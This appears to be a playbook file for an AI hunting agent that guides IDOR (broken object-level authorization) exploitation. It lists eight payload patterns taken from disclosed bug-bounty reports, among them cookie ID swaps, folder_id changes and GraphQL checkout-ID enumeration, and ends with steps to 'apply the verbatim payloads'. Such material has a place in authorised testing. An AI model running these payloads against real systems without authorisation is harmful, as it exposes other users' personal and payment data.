---
name: hunter-l4-idor
description: "Discover and exploit Insecure Direct Object Reference (IDOR)/broken object-level authorization using real endpoint+payload patterns from disclosed reports."
domain: cybersecurity
subdomain: web
tags:
- web
- idor
- hunting
- l4
version: '1.0'
---
# L4 Playbook: IDOR (hunter)

**L3 technique sheet:** `knowledge/sheets/idor.md` — (exists)

## When to use
Attack a target surface for IDOR. Load the L3 sheet for full sub-pattern detail; use the real exemplars below as concrete tests.

## Real validated patterns (from disclosed reports)

### 1004745 [ajaysenr]
- endpoint: `GET /profile`
- parameter: `UID2`
- payload: `UID2=4820036 (replacing UID2=4820038)`
- root cause: The profile page trusted the UID2 cookie to identify the current user without verifying it belonged to the session, allowing access to other users' pr
- impact: Changed the UID2 cookie to another user's ID (4820036) and successfully viewed that other user's personal information.

### 1005020 [ajaysenr]
- endpoint: `GET /api/user-list`
- parameter: `folder_id, count, projection`
- payload: `folder_id=7 (replacing folder_id=0)`
- root cause: The SERVER_GET_USER_LIST API accepted an arbitrary folder_id without authorization, returning other users' data including unencrypted user IDs.
- impact: Enumerated the unencrypted unique user IDs of all profiles in the user's deck/right-swiped folder by changing folder_id, exposing user_id, vote, and i

### 1007988 [ajaysenr]
- endpoint: `POST /wp-json/brc/v1/approval-requests/{num}/comments`
- parameter: `text, files, sizes, ticket id in URL`
- payload: `text=sure thanks&files=1597287925578-44741-%3Etest.jpg&sizes=4249`
- root cause: The support-ticket comments endpoint does not verify that the authenticated user owns the ticket referenced by the numeric ID in the URL (missing obje
- impact: User B could comment on User A's support ticket (ID 44799) and view both Instagram's and the user's ticket comments on the brand requests dashboard.

### 1017576 [ajaysenr]
- endpoint: `POST /api/storefront/conversations/{num}/order_lookup`
- parameter: `email, order_number`
- payload: `{"order_lookup":{"email":"victim@example.com","order_number":"1000 OR 1001 OR 1002"}}`
- root cause: order_lookup lacked input validation/rate limiting and accepted OR-style values in order_number to match multiple orders.
- impact: Retrieved any customer's first-order details by email alone and enumerated orders by supplying multiple order numbers.

### 1034346 [ajaysenr]
- endpoint: `POST /{program_uuid}/embedded_submissions/draft_sync`
- parameter: `draft_id, tracer, attachment_ids`
- payload: `{
  "draft_id": "1",
  "title": "This becomes the new title for draft 1",
  "vulnerability_information":"This becomes the new vulnerability information for draft 1"
}`
- root cause: draft_sync runs without authorization and looks up ReportDrafts by ID where reporter/tracer are NULL (security@ email-created drafts), and orphaned an
- impact: Attacker modified the contents of other users' report drafts (created via security@ email forwarding) and obtained copies of orphaned attachments (823

### 1044285 [ajaysenr]
- endpoint: `GET /checkout/get_download_link (delivery.shopifyapps.com)`
- parameter: `shop, checkout_token, callback`
- payload: `https://delivery.shopifyapps.com/checkout/get_download_link?callback=jQuery&shop=superhacks.myshopify.com&checkout_token=`
- root cause: When checkout_token is nil/empty the server returns the most recent order's digital download link without validating the token.
- impact: Demonstrated retrieval of the latest order's paid digital-asset download link (e.g. WILD WOLF PG000892.zip) with an empty checkout_token in incognito;

### 1048540 [ajaysenr]
- endpoint: `POST /██████ (redacted user-operations endpoint)`
- parameter: `UID, sendingForm`
- payload: `curl 'https://███'  --data-raw 'sendingForm=██████'`
- root cause: The UID parameter in the user-operations endpoint was not validated for authorization, allowing sequential enumeration.
- impact: Unauthenticated attacker enumerated sequential user IDs to scrape full names, emails, military branches, and ASVAB scores of all registered users; the

### 1064869 [ajaysenr]
- endpoint: `POST /graphql (CheckoutStatus, arrive-server.shopifycloud.com)`
- parameter: `id`
- payload: `{"operationName":"CheckoutStatus","variables":{"id":"48805"},"query":"query CheckoutStatus($id: ID!) {\n  checkoutStatus(id: $id) {\n    ... on Checkout {\n      id\n      isShopPay\n      payJsonPara`
- root cause: The CheckoutStatus GraphQL query returns checkout data for any sequential numeric checkout id without verifying the requester owns the checkout.
- impact: Enumerated checkout IDs 1-48908 and retrieved other users' checkout details (checkout secret, token, payJsonParams, shopify_domain), giving access to 

## Approach
1. Map endpoints that take identifiers/input (see L3 sheet for shapes).
2. Apply the verbatim payloads above; vary encoding/params.
3. Prove impact with a request+response+impact (evidence gate).

